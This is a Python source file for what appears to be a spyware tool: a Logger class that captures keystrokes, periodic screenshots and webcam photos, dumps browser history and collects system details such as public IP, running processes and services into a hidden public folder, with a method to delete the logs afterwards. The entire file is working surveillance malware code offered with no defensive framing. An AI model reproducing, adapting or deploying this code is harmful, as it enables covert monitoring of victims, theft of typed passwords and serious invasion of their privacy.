import json
import logging
import pathlib
import shutil
import browserhistory
import subprocess
import time
import cv2
import requests
from multiprocessing import Process
from pynput.keyboard import Listener
from PIL import ImageGrab


class Logger:

    def __init__(self, time_limit=300, time_interval=5, file_path='C:\\Users\\Public\\Logs\\'):
        print("Initiating a logger ...")
        self.logged_data = None
        self.time_limit = time_limit
        self.time_interval = time_interval
        self.file_path = file_path + 'logs/'
        self.screenshots_path = self.file_path + 'screenshots/'
        self.text_path = self.file_path + 'text/'
        self.webcam_path = self.file_path + 'webcam/'
        self.logging_keys_process = Process(target=self.log_keys)
        self.logging_screen_process = Process(target=self.log_screen)
        self.logging_webcam_process = Process(target=self.log_webcam)
        self.logging_browser_process = Process(target=self.log_browser_history)

    def gather_system_info(self):
        print("Gathering system information ...")
        with open(self.text_path + 'system_info.txt', 'a') as system_info:
            try:
                public_ip = requests.get('https://api.ipify.org').text
            except requests.ConnectionError:
                public_ip = '* Ipify connection failed *'

            system_info.write('Public IP Address: ' + public_ip + '\n')
            try:
                get_sys_info = subprocess.Popen(['systeminfo', '&', 'tasklist', '&', 'sc', 'query'],
                                                stdout=system_info, stderr=system_info, shell=True)

            except subprocess.TimeoutExpired:
                get_sys_info.kill()

    def create_paths(self):
        print("Creating paths ...")
        pathlib.Path(self.text_path).mkdir(parents=True, exist_ok=True)
        pathlib.Path(self.screenshots_path).mkdir(parents=True, exist_ok=True)
        pathlib.Path(self.webcam_path).mkdir(parents=True, exist_ok=True)

    def log(self, word):
        print("Key stroke logging ...")
        logging.basicConfig(filename=(self.text_path + 'key_logs.txt'),
                            level=logging.DEBUG, format='%(asctime)s: %(message)s')
        logging.info(str(word))

    def launch(self):
        self.create_paths()
        self.gather_system_info()
        print(f"Launching loggers ...")
        try:
            self.logging_keys_process.start()
            self.logging_screen_process.start()
            self.logging_webcam_process.start()
            self.logging_browser_process.start()

            self.logging_keys_process.join(timeout=self.time_limit)
            self.logging_screen_process.join(timeout=self.time_limit)
            self.logging_webcam_process.join(timeout=self.time_limit)
            self.logging_browser_process.join(timeout=self.time_limit)

        except Exception as error:
            logging.basicConfig(level=logging.DEBUG,
                                filename='C:/Users/Public/Logs/error_log.txt')
            logging.exception(f'Error occurred at {time.time()} : {error}')

        self.end()

    def log_keys(self):
        print("Listening to key strokes ...")
        with Listener(on_press=lambda key: self.log(word=key)) as listening:
            listening.join()

    def log_screen(self):
        for number in range(self.time_limit):
            print("Taking a screenshot ...")
            pic = ImageGrab.grab()
            pic.save(self.screenshots_path + f'screenshot_{number}_{round(time.time())}.png')
            time.sleep(self.time_interval)

    def log_webcam(self):
        webcam = cv2.VideoCapture(0)
        for number in range(self.time_limit):
            print("Taking a picture ...")
            _, picture = webcam.read()
            file = (self.webcam_path + f'webcam_{number}_{round(time.time())}.jpg')
            cv2.imwrite(file, picture)
            time.sleep(self.time_interval)

        webcam.release()
        cv2.destroyAllWindows()

    def log_browser_history(self):
        print("Gathering browser history ...")
        try:
            browser_history = []
            bh_user = browserhistory.get_username()
            db_path = browserhistory.get_database_paths()
            hist = browserhistory.get_browserhistory()
            browser_history.extend((bh_user, db_path, hist))
            with open(self.text_path + 'browser.txt', 'a') as browser_txt:
                browser_txt.write(json.dumps(browser_history))
        finally:
            pass

    def end(self):
        print(f"Terminating loggers ...")
        self.logging_keys_process.terminate()
        self.logging_screen_process.terminate()
        self.logging_webcam_process.terminate()
        self.logging_browser_process.terminate()

    def clean_up(self):
        print("Removing the log folder ...")
        try:
            shutil.rmtree(self.file_path)
        except OSError:
            print("Folder not found!")
